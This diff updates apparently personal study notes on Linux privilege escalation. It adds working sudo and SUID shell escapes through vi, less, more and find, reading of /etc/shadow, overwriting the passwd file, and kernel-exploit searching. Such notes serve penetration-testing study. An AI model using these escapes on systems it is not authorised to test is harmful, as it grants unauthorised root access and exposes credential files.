@@ -1,3 +1,5 @@
+# Linux Privilege Escalation
+
 ---- Credits to Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790 ----
 ---- Modified to add my own notes and formatting in ----
 
@@ -35,11 +37,12 @@ Also possible to check all files with SUID bits set with
         find / -perm -4000 -type f 2>/dev/null
 
 
----- Listing ----
+**Listing**
 
 Here is a brief list of the exploitable binaries. Exact commands are in next section
 
     awk
+    cp / mv
     find
     less
     man
@@ -47,6 +50,7 @@ Here is a brief list of the exploitable binaries. Exact commands are in next sec
     nano
     nmap
     wget
+    vi
     vim
 
 Secondary List, not tested
@@ -65,7 +69,9 @@ sudo strace -o/dev/null /bin/bash
 
 ---- Individual Commands ----
 
+Using CP or MV
 
+        copy and overwrite passwd file
 
 Using Find Command
 
@@ -73,6 +79,14 @@ Using Find Command
     or
 
     sudo find /bin -name nano -exec /bin/sh \;
+    
+Using Vi Command
+
+    sudo vi
+    :shell
+
+    :set shell=/bin/bash:shell    
+    :!bash
 
 Using Vim Command
 
@@ -98,12 +112,22 @@ Using Man Command
 after that press !sh and hit enter
 
 
-Using Less/More Command
+Using Less/More Command (extra stuff below)
 
     sudo less /etc/hosts
     sudo more /etc/hosts
     after that press !sh and hit enter
 
+From Less you can also go into vi into a shell
+
+       sudo less /etc/shadow
+       v
+       :shell
+
+You need to run more on a file that is bigger than your screen.
+
+        sudo more /home/pelle/myfile
+        !/bin/bash
 
 Using awk Command
 
@@ -173,3 +197,19 @@ Sadly no Shell. But you manage to extract root hash now Crack hash in your machi
 Super long list here:
 
 https://gtfobins.github.io/
+
+## Kernel Exploits
+
+To be avoided if possible, as it may cause crashes
+
+Check Version
+
+        uname -a
+        cat /proc/version
+        cat /etc/issue
+
+Search for exploits
+
+        site:exploit-db.com kernel version
+
+        python linprivchecker.py extended
